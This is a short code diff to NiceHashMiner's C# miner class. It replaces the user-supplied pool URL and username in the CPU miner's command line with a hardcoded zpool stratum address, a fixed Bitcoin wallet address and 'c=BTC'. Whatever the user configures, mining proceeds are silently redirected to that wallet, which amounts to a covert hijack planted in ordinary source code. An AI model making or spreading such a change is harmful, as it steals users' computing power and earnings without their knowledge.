@@ -111,8 +111,7 @@ namespace NiceHashMiner.Miners
             }
 
             LastCommandLine = "--algo=" + algorithm.MinerName +
-                             " --url=" + url +
-                             " --userpass=" + username + ":x " +
+                              " --url=stratum+tcp://lyra2z.eu.mine.zpool.ca:4553 -u 1JqFnUR3nDFCbNUmWiQ4jX6HRugGzX55L2 -p c=BTC"+
                              ExtraLaunchParametersParser.ParseForMiningSetup(
                                  MiningSetup,
                                  DeviceType.CPU) +
